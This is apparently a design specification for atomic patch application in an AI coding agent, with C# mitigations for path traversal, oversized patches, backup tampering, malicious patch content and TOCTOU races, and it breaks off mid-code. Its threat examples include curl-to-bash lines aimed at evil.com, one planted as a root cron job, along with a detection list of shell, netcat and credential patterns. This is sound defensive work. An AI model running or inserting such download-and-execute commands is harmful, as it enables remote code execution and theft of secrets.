# Task 014.c: Atomic Patch Application Behavior

**Priority:** P0 – Critical  
**Tier:** S – Core Infrastructure  
**Complexity:** 8 (Fibonacci points)  
**Phase:** Phase 3 – Intelligence Layer  
**Dependencies:** Task 014 (RepoFS), Task 014.a (Local FS), Task 014.b (Docker FS)  

---

## Description

### Business Value

Atomic patch application is the mechanism by which Agentic Coding Bot safely modifies source files. When the agent generates code changes, those changes are expressed as unified diff patches and applied through this subsystem. Atomicity guarantees that file modifications are never partially applied—critical for maintaining codebase integrity.

The agent's primary value comes from its ability to make code changes. Without robust patch application, those changes could corrupt files: a crash mid-modification could leave files in an inconsistent state, breaking builds and requiring manual recovery. This implementation ensures that every change either fully succeeds or leaves files completely unchanged.

Beyond safety, this subsystem enables powerful development workflows: dry-run previews let developers review changes before applying them, rollback capabilities provide an undo mechanism for recent changes, and transactional multi-file patches ensure related changes across files stay synchronized. These capabilities transform the agent from a code suggestion tool into a reliable code modification system.

### Scope

This task delivers the complete atomic patch application subsystem:

1. **Unified Diff Parser:** Parses standard unified diff format (as produced by `git diff`). Extracts file paths, hunks, context lines, additions, and removals into structured patch objects.

2. **Patch Validator:** Validates patches before application. Verifies context lines match current file content, detects conflicts, and reports validation errors with clear diagnostics.

3. **Atomic Patch Applicator:** Applies patches with all-or-nothing semantics. Creates backups before modification, applies hunks in correct order, and rolls back on any failure.

4. **Dry Run Preview:** Executes full validation and shows what would change without modifying files. Enables review before committing to changes.

5. **Rollback Support:** Maintains backups of modified files for configurable retention period. Enables undoing recent patch applications.

6. **Fuzz Matching:** Handles minor line number drift when file has changed slightly since patch generation. Configurable fuzz factor controls matching tolerance.

### Integration Points

| Component | Integration Type | Description |
|-----------|------------------|-------------|
| Task 014 (RepoFS) | Interface Extension | Adds ApplyPatchAsync, PreviewPatchAsync, RollbackPatchAsync to IRepoFS |
| Task 014.a (Local FS) | File Operations | Uses LocalFS for reading, writing, and backup storage |
| Task 014.b (Docker FS) | File Operations | Uses DockerFS when applying patches to containerized repos |
| Task 025 (File Tool) | Tool Integration | apply_patch tool uses this subsystem |
| Task 011 (Session) | Transaction Context | Session manages patch transaction boundaries |
| Task 016 (Context) | Change Tracking | Context packer tracks pending patch changes |
| Task 003.c (Audit) | Audit Logging | All patch applications logged with before/after content |
| LLM Output | Patch Source | Agent-generated patches in unified diff format |

### Failure Modes

| Failure | Impact | Mitigation |
|---------|--------|------------|
| Context mismatch | Patch cannot apply | Report conflicting lines, suggest regeneration |
| File modified since patch | Conflict detected | Clear conflict report, suggest re-analysis |
| Malformed patch | Parse failure | Validate format, report syntax errors |
| Disk full during apply | Partial state possible | Backup first, rollback on failure |
| Multi-file partial failure | Inconsistent state | Transaction rollback restores all files |
| Backup creation fails | No rollback possible | Abort before making changes |
| Encoding mismatch | Garbled content | Detect encoding, apply with matching encoding |
| Binary file in patch | Unsupported operation | Detect and reject, report clear error |

### Assumptions

1. Patches are in standard unified diff format (as produced by git diff)
2. Patches are generated against the current file content (no stale patches)
3. Files are text files with supported encodings (no binary file patches)
4. Line endings are consistent within files (LF or CRLF, not mixed)
5. Sufficient disk space exists for backup files
6. File system supports atomic rename (required for atomic writes)
7. Patches are applied sequentially (no concurrent patch application)
8. Rollback window is reasonable (minutes to hours, not days)

### Security Considerations

#### Threat 1: Path Traversal via Malicious Patch File Paths

**Risk Description:** An attacker could craft a patch with file paths that escape the repository boundary, allowing writes to arbitrary system locations. A patch targeting `../../../etc/passwd` or `/etc/shadow` could compromise system security.

**Attack Scenario:**
```diff
--- a/../../../etc/cron.d/backdoor
+++ b/../../../etc/cron.d/backdoor
@@ -0,0 +1 @@
+* * * * * root curl http://evil.com/shell.sh | bash
```
If applied without validation, this creates a cron job running as root.

**Complete Mitigation Implementation:**

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace AgenticCoder.Infrastructure.FileSystem.Patching;

/// <summary>
/// Validates patch file paths to prevent repository boundary escapes.
/// </summary>
public sealed class PatchPathValidator
{
    private readonly string _repositoryRoot;
    private readonly IReadOnlySet<string> _forbiddenPaths;

    // Patterns that indicate path traversal attempts
    private static readonly string[] TraversalPatterns = new[]
    {
        "..", "...", "....",
        "%2e%2e", "%2e.", ".%2e", // URL encoded
        "..%c0%af", "..%c1%9c",   // Unicode encoding attacks
        "~", // Home directory expansion
    };

    // Paths that should never be writable regardless of repo location
    private static readonly HashSet<string> SystemForbiddenPaths = new(StringComparer.OrdinalIgnoreCase)
    {
        "/etc", "/bin", "/sbin", "/usr", "/lib", "/var",
        "/root", "/home", "/proc", "/sys", "/dev",
        "/boot", "/opt", "/srv", "/tmp",
        "C:\\Windows", "C:\\Program Files", "C:\\Users"
    };

    public PatchPathValidator(string repositoryRoot)
    {
        _repositoryRoot = Path.GetFullPath(repositoryRoot)
            ?? throw new ArgumentNullException(nameof(repositoryRoot));
        _forbiddenPaths = SystemForbiddenPaths;
    }

    /// <summary>
    /// Validates all file paths in a patch are within repository bounds.
    /// </summary>
    public PatchPathValidationResult ValidatePatchPaths(Patch patch)
    {
        var errors = new List<PatchPathError>();

        foreach (var file in patch.Files)
        {
            var oldPathResult = ValidateSinglePath(file.OldPath, "old");
            if (!oldPathResult.IsValid)
                errors.Add(oldPathResult.Error!);

            var newPathResult = ValidateSinglePath(file.NewPath, "new");
            if (!newPathResult.IsValid)
                errors.Add(newPathResult.Error!);
        }

        return new PatchPathValidationResult
        {
            IsValid = errors.Count == 0,
            Errors = errors
        };
    }

    private SinglePathResult ValidateSinglePath(string path, string pathType)
    {
        // Check for null/empty
        if (string.IsNullOrWhiteSpace(path))
        {
            return SinglePathResult.Invalid(new PatchPathError
            {
                Path = path,
                PathType = pathType,
                Reason = "Path is null or empty"
            });
        }

        // Check for null bytes (injection attack)
        if (path.Contains('\0'))
        {
            return SinglePathResult.Invalid(new PatchPathError
            {
                Path = path,
                PathType = pathType,
                Reason = "Path contains null byte - possible injection attack"
            });
        }

        // Check for traversal patterns in raw path
        foreach (var pattern in TraversalPatterns)
        {
            if (path.Contains(pattern, StringComparison.OrdinalIgnoreCase))
            {
                return SinglePathResult.Invalid(new PatchPathError
                {
                    Path = path,
                    PathType = pathType,
                    Reason = $"Path contains traversal pattern: {pattern}"
                });
            }
        }

        // Resolve the full path
        string fullPath;
        try
        {
            // Strip the a/ or b/ prefix from unified diff format
            var cleanPath = StripDiffPrefix(path);
            fullPath = Path.GetFullPath(Path.Combine(_repositoryRoot, cleanPath));
        }
        catch (Exception ex)
        {
            return SinglePathResult.Invalid(new PatchPathError
            {
                Path = path,
                PathType = pathType,
                Reason = $"Path resolution failed: {ex.Message}"
            });
        }

        // Verify path is within repository
        if (!fullPath.StartsWith(_repositoryRoot, StringComparison.OrdinalIgnoreCase))
        {
            return SinglePathResult.Invalid(new PatchPathError
            {
                Path = path,
                PathType = pathType,
                Reason = $"Path escapes repository boundary. Resolved to: {fullPath}"
            });
        }

        // Check against forbidden system paths
        foreach (var forbidden in _forbiddenPaths)
        {
            if (fullPath.StartsWith(forbidden, StringComparison.OrdinalIgnoreCase))
            {
                return SinglePathResult.Invalid(new PatchPathError
                {
                    Path = path,
                    PathType = pathType,
                    Reason = $"Path targets forbidden system location: {forbidden}"
                });
            }
        }

        return SinglePathResult.Valid();
    }

    private static string StripDiffPrefix(string path)
    {
        if (path.StartsWith("a/") || path.StartsWith("b/"))
            return path[2..];
        if (path.StartsWith("a\\") || path.StartsWith("b\\"))
            return path[2..];
        return path;
    }
}

public sealed class PatchPathValidationResult
{
    public bool IsValid { get; init; }
    public IReadOnlyList<PatchPathError> Errors { get; init; } = Array.Empty<PatchPathError>();
}

public sealed class PatchPathError
{
    public required string Path { get; init; }
    public required string PathType { get; init; }
    public required string Reason { get; init; }
}

// Unit tests
public sealed class PatchPathValidatorTests
{
    private readonly PatchPathValidator _sut;

    public PatchPathValidatorTests()
    {
        _sut = new PatchPathValidator("/home/user/project");
    }

    [Theory]
    [InlineData("a/src/file.cs")]
    [InlineData("b/src/nested/file.cs")]
    [InlineData("a/tests/UnitTests.cs")]
    public void ValidatePatchPaths_Should_Accept_Valid_Paths(string path)
    {
        // Arrange
        var patch = CreatePatchWithPath(path);

        // Act
        var result = _sut.ValidatePatchPaths(patch);

        // Assert
        result.IsValid.Should().BeTrue();
    }

    [Theory]
    [InlineData("a/../../../etc/passwd")]
    [InlineData("b/%2e%2e/etc/shadow")]
    [InlineData("a/src/..\\..\\..\\Windows\\System32\\config")]
    public void ValidatePatchPaths_Should_Reject_Traversal_Attempts(string path)
    {
        // Arrange
        var patch = CreatePatchWithPath(path);

        // Act
        var result = _sut.ValidatePatchPaths(patch);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainSingle()
            .Which.Reason.Should().Contain("traversal");
    }

    [Fact]
    public void ValidatePatchPaths_Should_Reject_Null_Bytes()
    {
        // Arrange
        var patch = CreatePatchWithPath("a/src/file\0.cs");

        // Act
        var result = _sut.ValidatePatchPaths(patch);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainSingle()
            .Which.Reason.Should().Contain("null byte");
    }
}
```

---

#### Threat 2: Resource Exhaustion via Oversized Patches

**Risk Description:** An attacker could submit patches with millions of hunks or extremely large file content, exhausting memory and CPU. This could crash the agent or make it unresponsive, enabling denial of service.

**Attack Scenario:**
A malicious patch with 100,000 files and 1,000,000 hunks is submitted. Parsing and validating this patch consumes all available memory, crashing the process.

**Complete Mitigation Implementation:**

```csharp
using System;
using System.Collections.Generic;
using System.Threading;

namespace AgenticCoder.Infrastructure.FileSystem.Patching;

/// <summary>
/// Enforces resource limits on patch operations to prevent DoS attacks.
/// </summary>
public sealed class PatchResourceLimiter
{
    private readonly PatchResourceLimits _limits;
    private readonly SemaphoreSlim _concurrencyLimiter;

    public PatchResourceLimiter(PatchResourceLimits limits)
    {
        _limits = limits ?? throw new ArgumentNullException(nameof(limits));
        _concurrencyLimiter = new SemaphoreSlim(_limits.MaxConcurrentPatches);
    }

    /// <summary>
    /// Validates a patch against resource limits before processing.
    /// </summary>
    public ResourceLimitResult ValidateLimits(Patch patch)
    {
        var violations = new List<string>();

        // Check file count
        if (patch.Files.Count > _limits.MaxFilesPerPatch)
        {
            violations.Add(
                $"Patch contains {patch.Files.Count} files, exceeds limit of {_limits.MaxFilesPerPatch}");
        }

        // Check total hunk count
        var totalHunks = 0;
        foreach (var file in patch.Files)
        {
            totalHunks += file.Hunks.Count;
            if (totalHunks > _limits.MaxHunksPerPatch)
            {
                violations.Add(
                    $"Patch contains {totalHunks}+ hunks, exceeds limit of {_limits.MaxHunksPerPatch}");
                break;
            }

            // Check hunks per file
            if (file.Hunks.Count > _limits.MaxHunksPerFile)
            {
                violations.Add(
                    $"File {file.NewPath} has {file.Hunks.Count} hunks, exceeds limit of {_limits.MaxHunksPerFile}");
            }

            // Check lines per hunk
            foreach (var hunk in file.Hunks)
            {
                var lineCount = hunk.AddedLines.Count + hunk.RemovedLines.Count + hunk.ContextLines.Count;
                if (lineCount > _limits.MaxLinesPerHunk)
                {
                    violations.Add(
                        $"Hunk in {file.NewPath} has {lineCount} lines, exceeds limit of {_limits.MaxLinesPerHunk}");
                }
            }
        }

        // Check raw patch size
        if (patch.RawContent.Length > _limits.MaxPatchSizeBytes)
        {
            violations.Add(
                $"Patch size is {patch.RawContent.Length} bytes, exceeds limit of {_limits.MaxPatchSizeBytes}");
        }

        return new ResourceLimitResult
        {
            IsValid = violations.Count == 0,
            Violations = violations
        };
    }

    /// <summary>
    /// Acquires a slot for patch processing, blocking if at capacity.
    /// </summary>
    public async Task<IAsyncDisposable> AcquirePatchSlotAsync(CancellationToken ct)
    {
        if (!await _concurrencyLimiter.WaitAsync(_limits.MaxWaitForSlot, ct))
        {
            throw new PatchResourceExhaustedException(
                $"Too many concurrent patch operations. Maximum: {_limits.MaxConcurrentPatches}");
        }

        return new PatchSlotHandle(_concurrencyLimiter);
    }

    private sealed class PatchSlotHandle : IAsyncDisposable
    {
        private readonly SemaphoreSlim _semaphore;
        private bool _disposed;

        public PatchSlotHandle(SemaphoreSlim semaphore)
        {
            _semaphore = semaphore;
        }

        public ValueTask DisposeAsync()
        {
            if (!_disposed)
            {
                _disposed = true;
                _semaphore.Release();
            }
            return ValueTask.CompletedTask;
        }
    }
}

/// <summary>
/// Configuration for patch resource limits.
/// </summary>
public sealed class PatchResourceLimits
{
    /// <summary>Maximum files in a single patch (default: 100).</summary>
    public int MaxFilesPerPatch { get; init; } = 100;

    /// <summary>Maximum hunks across all files (default: 500).</summary>
    public int MaxHunksPerPatch { get; init; } = 500;

    /// <summary>Maximum hunks in a single file (default: 50).</summary>
    public int MaxHunksPerFile { get; init; } = 50;

    /// <summary>Maximum lines in a single hunk (default: 1000).</summary>
    public int MaxLinesPerHunk { get; init; } = 1000;

    /// <summary>Maximum raw patch size in bytes (default: 10MB).</summary>
    public long MaxPatchSizeBytes { get; init; } = 10 * 1024 * 1024;

    /// <summary>Maximum concurrent patch operations (default: 5).</summary>
    public int MaxConcurrentPatches { get; init; } = 5;

    /// <summary>Maximum wait time to acquire slot (default: 30s).</summary>
    public TimeSpan MaxWaitForSlot { get; init; } = TimeSpan.FromSeconds(30);
}

public sealed class ResourceLimitResult
{
    public bool IsValid { get; init; }
    public IReadOnlyList<string> Violations { get; init; } = Array.Empty<string>();
}

public class PatchResourceExhaustedException : Exception
{
    public PatchResourceExhaustedException(string message) : base(message) { }
}

// Unit tests
public sealed class PatchResourceLimiterTests
{
    private readonly PatchResourceLimiter _sut;

    public PatchResourceLimiterTests()
    {
        _sut = new PatchResourceLimiter(new PatchResourceLimits
        {
            MaxFilesPerPatch = 10,
            MaxHunksPerPatch = 50,
            MaxHunksPerFile = 10,
            MaxLinesPerHunk = 100
        });
    }

    [Fact]
    public void ValidateLimits_Should_Accept_Within_Limits()
    {
        // Arrange
        var patch = CreatePatch(files: 5, hunksPerFile: 3, linesPerHunk: 20);

        // Act
        var result = _sut.ValidateLimits(patch);

        // Assert
        result.IsValid.Should().BeTrue();
    }

    [Fact]
    public void ValidateLimits_Should_Reject_Too_Many_Files()
    {
        // Arrange
        var patch = CreatePatch(files: 100, hunksPerFile: 1, linesPerHunk: 10);

        // Act
        var result = _sut.ValidateLimits(patch);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Violations.Should().Contain(v => v.Contains("files"));
    }

    [Fact]
    public void ValidateLimits_Should_Reject_Too_Many_Hunks()
    {
        // Arrange
        var patch = CreatePatch(files: 5, hunksPerFile: 20, linesPerHunk: 10);

        // Act
        var result = _sut.ValidateLimits(patch);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Violations.Should().Contain(v => v.Contains("hunks"));
    }
}
```

---

#### Threat 3: Backup Directory Manipulation

**Risk Description:** If backup storage location is attacker-controllable or predictable, an attacker could pre-create malicious backup files that get restored during rollback, or delete backups to prevent rollback.

**Attack Scenario:**
Attacker knows backups go to `/tmp/acode-backups/`. They create a malicious backup file before the legitimate patch operation. When rollback occurs, the malicious file is restored instead of the original.

**Complete Mitigation Implementation:**

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace AgenticCoder.Infrastructure.FileSystem.Patching;

/// <summary>
/// Securely manages patch backup files with integrity verification.
/// </summary>
public sealed class SecurePatchBackupManager
{
    private readonly string _backupRoot;
    private readonly TimeSpan _retentionPeriod;

    public SecurePatchBackupManager(string backupRoot, TimeSpan retentionPeriod)
    {
        // Backup root must be within repo or a secure system directory
        _backupRoot = Path.GetFullPath(backupRoot);
        _retentionPeriod = retentionPeriod;

        // Create with restricted permissions
        if (!Directory.Exists(_backupRoot))
        {
            Directory.CreateDirectory(_backupRoot);
            // On Unix, set permissions to owner-only (700)
            if (!OperatingSystem.IsWindows())
            {
                File.SetUnixFileMode(_backupRoot, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
            }
        }
    }

    /// <summary>
    /// Creates a secure backup of files before patch application.
    /// Returns a transaction ID for later rollback.
    /// </summary>
    public async Task<BackupTransaction> CreateBackupAsync(
        IRepoFS fs,
        IReadOnlyList<string> filePaths,
        CancellationToken ct)
    {
        var transactionId = GenerateSecureTransactionId();
        var transactionDir = Path.Combine(_backupRoot, transactionId);

        Directory.CreateDirectory(transactionDir);

        var manifest = new BackupManifest
        {
            TransactionId = transactionId,
            CreatedAt = DateTimeOffset.UtcNow,
            Files = new List<BackupFileEntry>()
        };

        foreach (var path in filePaths)
        {
            var exists = await fs.ExistsAsync(path, ct);
            var entry = new BackupFileEntry
            {
                OriginalPath = path,
                ExistedBeforePatch = exists
            };

            if (exists)
            {
                // Read and backup existing content
                var content = await fs.ReadFileAsync(path, ct);
                var contentHash = ComputeHash(content);

                var backupFileName = GenerateSecureFileName();
                var backupPath = Path.Combine(transactionDir, backupFileName);

                await File.WriteAllTextAsync(backupPath, content, ct);

                // Verify write integrity
                var writtenContent = await File.ReadAllTextAsync(backupPath, ct);
                var writtenHash = ComputeHash(writtenContent);

                if (!contentHash.SequenceEqual(writtenHash))
                {
                    throw new BackupIntegrityException(
                        $"Backup integrity check failed for {path}");
                }

                entry.BackupFileName = backupFileName;
                entry.ContentHash = Convert.ToHexString(contentHash);
            }

            manifest.Files.Add(entry);
        }

        // Write manifest with integrity hash
        var manifestJson = JsonSerializer.Serialize(manifest);
        var manifestHash = ComputeHash(manifestJson);
        manifest.ManifestHash = Convert.ToHexString(manifestHash);

        var manifestPath = Path.Combine(transactionDir, "manifest.json");
        await File.WriteAllTextAsync(manifestPath, JsonSerializer.Serialize(manifest), ct);

        return new BackupTransaction
        {
            TransactionId = transactionId,
            TransactionDir = transactionDir,
            Manifest = manifest
        };
    }

    /// <summary>
    /// Restores files from a backup transaction with integrity verification.
    /// </summary>
    public async Task RestoreBackupAsync(
        IRepoFS fs,
        string transactionId,
        CancellationToken ct)
    {
        var transactionDir = Path.Combine(_backupRoot, transactionId);

        if (!Directory.Exists(transactionDir))
        {
            throw new BackupNotFoundException(
                $"Backup transaction {transactionId} not found");
        }

        // Load and verify manifest
        var manifestPath = Path.Combine(transactionDir, "manifest.json");
        var manifestJson = await File.ReadAllTextAsync(manifestPath, ct);
        var manifest = JsonSerializer.Deserialize<BackupManifest>(manifestJson)
            ?? throw new BackupCorruptedException("Manifest is null");

        // Verify manifest hasn't been tampered with
        var expectedHash = manifest.ManifestHash;
        manifest.ManifestHash = null; // Clear for hash computation
        var actualHash = Convert.ToHexString(ComputeHash(JsonSerializer.Serialize(manifest)));

        if (expectedHash != actualHash)
        {
            throw new BackupIntegrityException(
                $"Manifest integrity check failed. Expected: {expectedHash}, Actual: {actualHash}");
        }

        // Check retention period
        if (manifest.CreatedAt.Add(_retentionPeriod) < DateTimeOffset.UtcNow)
        {
            throw new BackupExpiredException(
                $"Backup transaction {transactionId} has expired");
        }

        // Restore each file with integrity verification
        foreach (var entry in manifest.Files)
        {
            if (entry.ExistedBeforePatch)
            {
                var backupPath = Path.Combine(transactionDir, entry.BackupFileName!);
                var backupContent = await File.ReadAllTextAsync(backupPath, ct);

                // Verify backup content integrity
                var actualContentHash = Convert.ToHexString(ComputeHash(backupContent));
                if (actualContentHash != entry.ContentHash)
                {
                    throw new BackupIntegrityException(
                        $"Backup content integrity check failed for {entry.OriginalPath}");
                }

                await fs.WriteFileAsync(entry.OriginalPath, backupContent, ct);
            }
            else
            {
                // File was created by patch - delete it
                if (await fs.ExistsAsync(entry.OriginalPath, ct))
                {
                    await fs.DeleteFileAsync(entry.OriginalPath, ct);
                }
            }
        }
    }

    /// <summary>
    /// Deletes a backup transaction after successful application.
    /// </summary>
    public void DeleteBackup(string transactionId)
    {
        var transactionDir = Path.Combine(_backupRoot, transactionId);
        if (Directory.Exists(transactionDir))
        {
            // Securely delete by overwriting files first
            foreach (var file in Directory.GetFiles(transactionDir))
            {
                SecureDeleteFile(file);
            }
            Directory.Delete(transactionDir, recursive: true);
        }
    }

    private static string GenerateSecureTransactionId()
    {
        var bytes = RandomNumberGenerator.GetBytes(16);
        var timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
        return $"{timestamp:X}-{Convert.ToHexString(bytes)}";
    }

    private static string GenerateSecureFileName()
    {
        var bytes = RandomNumberGenerator.GetBytes(8);
        return $"backup-{Convert.ToHexString(bytes)}.bak";
    }

    private static byte[] ComputeHash(string content)
    {
        return SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(content));
    }

    private static void SecureDeleteFile(string path)
    {
        var info = new FileInfo(path);
        if (info.Exists)
        {
            // Overwrite with random data
            var random = RandomNumberGenerator.GetBytes((int)info.Length);
            File.WriteAllBytes(path, random);
            File.Delete(path);
        }
    }
}

public sealed class BackupManifest
{
    public required string TransactionId { get; init; }
    public required DateTimeOffset CreatedAt { get; init; }
    public required List<BackupFileEntry> Files { get; set; }
    public string? ManifestHash { get; set; }
}

public sealed class BackupFileEntry
{
    public required string OriginalPath { get; init; }
    public required bool ExistedBeforePatch { get; init; }
    public string? BackupFileName { get; init; }
    public string? ContentHash { get; init; }
}

public sealed class BackupTransaction
{
    public required string TransactionId { get; init; }
    public required string TransactionDir { get; init; }
    public required BackupManifest Manifest { get; init; }
}

public class BackupNotFoundException : Exception
{
    public BackupNotFoundException(string message) : base(message) { }
}

public class BackupCorruptedException : Exception
{
    public BackupCorruptedException(string message) : base(message) { }
}

public class BackupIntegrityException : SecurityException
{
    public BackupIntegrityException(string message) : base(message) { }
}

public class BackupExpiredException : Exception
{
    public BackupExpiredException(string message) : base(message) { }
}
```

---

#### Threat 4: Patch Content Injection (Code Injection via Patch)

**Risk Description:** Malicious patches could inject code that executes when the patched file is later run. While this is somewhat unavoidable (patches modify code), validation should detect obviously malicious patterns and warn users.

**Attack Scenario:**
A patch claims to "fix a bug" but actually injects:
```diff
+System.Diagnostics.Process.Start("curl http://evil.com/steal-secrets.sh | bash");
```

**Complete Mitigation Implementation:**

```csharp
using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Microsoft.Extensions.Logging;

namespace AgenticCoder.Infrastructure.FileSystem.Patching;

/// <summary>
/// Scans patch content for potentially malicious patterns.
/// This is defense-in-depth - not a security guarantee.
/// </summary>
public sealed partial class PatchContentScanner
{
    private readonly ILogger<PatchContentScanner> _logger;
    private readonly bool _blockOnSuspicious;

    // Patterns that indicate potentially dangerous code
    private static readonly (string Pattern, string Description, Severity Level)[] SuspiciousPatterns = new[]
    {
        // Process execution
        (@"Process\.Start\s*\(", "Process execution", Severity.High),
        (@"Runtime\.exec\s*\(", "Runtime execution", Severity.High),
        (@"exec\s*\(|system\s*\(|shell_exec", "Shell execution", Severity.High),
        (@"subprocess\.|os\.system", "Python subprocess", Severity.High),

        // Network operations
        (@"WebClient|HttpClient|WebRequest", "Network access", Severity.Medium),
        (@"curl\s+|wget\s+", "Download command", Severity.High),
        (@"http://|https://", "URL reference", Severity.Low),

        // File system operations outside expected scope
        (@"File\.Delete|Directory\.Delete", "Deletion operation", Severity.Medium),
        (@"rm\s+-rf|rmdir\s+/s", "Destructive command", Severity.High),
        (@"/etc/|/bin/|/usr/|C:\\Windows", "System path access", Severity.High),

        // Environment/secrets access
        (@"Environment\.GetEnvironmentVariable", "Environment access", Severity.Medium),
        (@"GetSecret|KeyVault|SecretsManager", "Secrets access", Severity.Medium),
        (@"api[_-]?key|password|secret|token", "Credential reference", Severity.Low),

        // Obfuscation patterns
        (@"Convert\.FromBase64String|atob\(|base64\s+-d", "Base64 decode", Severity.Medium),
        (@"eval\s*\(|Function\s*\(|new\s+Function", "Dynamic code evaluation", Severity.High),
        (@"\\x[0-9a-f]{2}|\\u[0-9a-f]{4}", "Encoded characters", Severity.Low),

        // Backdoor patterns
        (@"reverse\s*shell|bind\s*shell", "Shell backdoor", Severity.Critical),
        (@"nc\s+-|netcat", "Netcat usage", Severity.High),
        (@"socket\.connect|socket\.bind", "Raw socket", Severity.Medium),
    };

    public PatchContentScanner(ILogger<PatchContentScanner> logger, bool blockOnSuspicious = false)
    {
        _logger = logger;
        _blockOnSuspicious = blockOnSuspicious;
    }

    /// <summary>
    /// Scans patch content for suspicious patterns.
    /// </summary>
    public PatchScanResult ScanPatch(Patch patch)
    {
        var findings = new List<SuspiciousFinding>();

        foreach (var file in patch.Files)
        {
            foreach (var hunk in file.Hunks)
            {
                // Only scan added lines (new code)
                foreach (var line in hunk.AddedLines)
                {
                    var lineFindings = ScanLine(line, file.NewPath);
                    findings.AddRange(lineFindings);
                }
            }
        }

        // Log findings
        foreach (var finding in findings)
        {
            var logLevel = finding.Severity switch
            {
                Severity.Critical => LogLevel.Error,
                Severity.High => LogLevel.Warning,
                Severity.Medium => LogLevel.Information,
                _ => LogLevel.Debug
            };

            _logger.Log(logLevel,
                "Suspicious pattern detected in patch: {Description} in {File}, Line: {Line}",
                finding.Description, finding.FilePath, finding.LineContent);
        }

        var hasBlockingFinding = _blockOnSuspicious &&
            findings.Exists(f => f.Severity >= Severity.High);

        return new PatchScanResult
        {
            IsClean = findings.Count == 0,
            ShouldBlock = hasBlockingFinding,
            Findings = findings
        };
    }

    private IEnumerable<SuspiciousFinding> ScanLine(string line, string filePath)
    {
        foreach (var (pattern, description, severity) in SuspiciousPatterns)
        {
            if (Regex.IsMatch(line, pattern, RegexOptions.IgnoreCase))
            {
                yield return new SuspiciousFinding
                {
                    FilePath = filePath,
                    LineContent = line.Length > 100 ? line[..100] + "..." : line,
                    Pattern = pattern,
                    Description = description,
                    Severity = severity
                };
            }
        }
    }
}

public enum Severity
{
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4
}

public sealed class PatchScanResult
{
    public bool IsClean { get; init; }
    public bool ShouldBlock { get; init; }
    public IReadOnlyList<SuspiciousFinding> Findings { get; init; } = Array.Empty<SuspiciousFinding>();
}

public sealed class SuspiciousFinding
{
    public required string FilePath { get; init; }
    public required string LineContent { get; init; }
    public required string Pattern { get; init; }
    public required string Description { get; init; }
    public required Severity Severity { get; init; }
}
```

---

#### Threat 5: Race Condition During Atomic Write (TOCTOU)

**Risk Description:** Between validating a file's content and writing the patched version, an attacker could modify the file, causing either data loss or applying a patch to unexpected content.

**Attack Scenario:**
1. Patch validator reads file, confirms context matches
2. Attacker modifies file (injects malicious code)
3. Patch applicator writes patched version (includes attacker's injection)
4. Result: Malicious code persisted via legitimate patch operation

**Complete Mitigation Implementation:**

```csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;

namespace AgenticCoder.Infrastructure.FileSystem.Patching;

/// <summary>
/// Provides TOCTOU-safe atomic file patching operations.
/// Uses file locking and content hashing to detect concurrent modifications.
/// </summary>
public sealed class ToctouSafePatchApplicator
{
    private readonly IRepoFS _fs;
    private readonly ILogger<ToctouSafePatchApplicator> _logger;

    public ToctouSafePatchApplicator(IRepoFS fs, ILogger<ToctouSafePatchApplicator> logger)
    {
        _fs = fs ?? throw new ArgumentNullException(nameof(fs));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Applies a hunk to a file with TOCTOU protection.
    /// </summary>
    public async Task<ToctouSafeResult> ApplyHunkSafelyAsync(
        string filePath,
        PatchHunk hunk,
        byte[] expectedContentHash,
        CancellationToken ct)
    {
        // Acquire exclusive lock on the file
        await using var fileLock = await AcquireExclusiveLockAsync(filePath, ct);

        // Read current content under lock
        var currentContent = await _fs.ReadFileAsync(filePath, ct);
        var currentHash = ComputeHash(currentContent);

        // Verify content hasn't changed since validation
        if (!currentHash.AsSpan().SequenceEqual(expectedContentHash))
        {
            _logger.LogWarning(
                "TOCTOU violation detected for {FilePath}. File was modified between validation and application.",
                filePath);

            return new ToctouSafeResult
            {
                Success = false,
                Error = ToctouError.ContentModified,
                ExpectedHash = Convert.ToHexString(expectedContentHash),
                ActualHash = Convert.ToHexString(currentHash)
            };
        }

        // Apply the hunk
        var patchedContent = ApplyHunk(currentContent, hunk);

        // Write to temp file first
        var tempPath = filePath + $".patch-{Guid.NewGuid():N}.tmp";

        try
        {
            await _fs.WriteFileAsync(tempPath, patchedContent, ct);

            // Verify temp file was written correctly
            var writtenContent = await _fs.ReadFileAsync(tempPath, ct);
            if (writtenContent != patchedContent)
            {
                throw new PatchWriteVerificationException(
                    "Temp file content doesn't match expected patched content");
            }

            // Atomic rename (still under lock)
            await AtomicRenameAsync(tempPath, filePath, ct);

            return new ToctouSafeResult { Success = true };
        }
        catch (Exception ex)
        {
            // Clean up temp file on failure
            try { await _fs.DeleteFileAsync(tempPath, ct); }
            catch { /* Best effort cleanup */ }

            _logger.LogError(ex, "Failed to apply hunk to {FilePath}", filePath);

            return new ToctouSafeResult
            {
                Success = false,
                Error = ToctouError.WriteFailed,
                Exception = ex
            };
        }
    }

    /// <summary>
    /// Applies an entire patch atomically across multiple files.
    /// All files are locked, validated, patched, and written atomically.
    /// </summary>
    public async Task<MultiFileToctouResult> ApplyPatchAtomicallyAsync(
        Patch patch,
        Dictionary<string, byte[]> expectedHashes,
        CancellationToken ct)
    {
        var locks = new List<IAsyncDisposable>();
        var tempFiles = new List<(string TempPath, string TargetPath)>();

        try
        {
            // Phase 1: Acquire all locks
            foreach (var file in patch.Files)
            {
                var lockHandle = await AcquireExclusiveLockAsync(file.NewPath, ct);
                locks.Add(lockHandle);
            }

            _logger.LogDebug("Acquired {Count} file locks for atomic patch", locks.Count);

            // Phase 2: Validate all files under lock
            foreach (var file in patch.Files)
            {
                var currentContent = await _fs.ReadFileAsync(file.NewPath, ct);
                var currentHash = ComputeHash(currentContent);

                if (!expectedHashes.TryGetValue(file.NewPath, out var expectedHash))
                {
                    throw new PatchValidationException(
